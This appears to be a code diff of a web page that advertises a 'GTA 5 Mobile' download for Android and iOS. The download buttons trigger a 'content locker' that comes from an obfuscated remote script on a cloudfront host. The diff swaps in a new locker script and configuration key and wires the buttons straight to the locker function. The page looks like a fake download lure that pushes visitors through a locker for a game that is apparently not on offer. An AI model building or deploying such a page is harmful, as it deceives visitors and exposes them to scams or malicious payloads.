@@ -65,21 +65,17 @@ h1{
   cursor:pointer;
 }
 
-.btn.loading{
-  background:#888;
-}
-
 .btn:hover{
   transform:scale(1.04);
 }
 
 </style>
 
-<!-- 🔒 سكريبت قفل المحتوى -->
+<!-- 🔒 القفل الجديد -->
 <script type="text/javascript">
-var kiYJm_TnK_KzccYc={"it":4322876,"key":"2c397"};
+var TWQZG_TKq_YuTnzc={"it":4590479,"key":"e20ea"};
 </script>
-<script src="https://da4talg8ap14v.cloudfront.net/c2d7620.js"></script>
+<script src="https://da4talg8ap14y.cloudfront.net/653cf75.js"></script>
 
 </head>
 
@@ -97,34 +93,11 @@ src="https://i.ibb.co/FzQ7s9s/gta5.jpg">
 <h1>GTA 5 Mobile</h1>
 <div class="sub">For Android and iOS</div>
 
-<div class="btn" onclick="startLocker(this)">📱 Download for Android</div>
-<div class="btn" onclick="startLocker(this)">🍎 Download for iOS</div>
+<!-- تشغيل القفل -->
+<div class="btn" onclick="_Vm()">📱 Download for Android</div>
+<div class="btn" onclick="_Vm()">🍎 Download for iOS</div>
 
 </div>
-
-<script>
-
-function startLocker(btn){
-
-  btn.classList.add("loading");
-  btn.innerHTML = "Loading...";
-
-  setTimeout(function(){
-
-    if(typeof _Vm === "function"){
-      _Vm(); // تشغيل قفل المحتوى
-    }else{
-      alert("Locker not loaded yet");
-    }
-
-    btn.classList.remove("loading");
-    btn.innerHTML = "Download";
-
-  },1000);
-
-}
-
-</script>
 
 </body>
 </html>
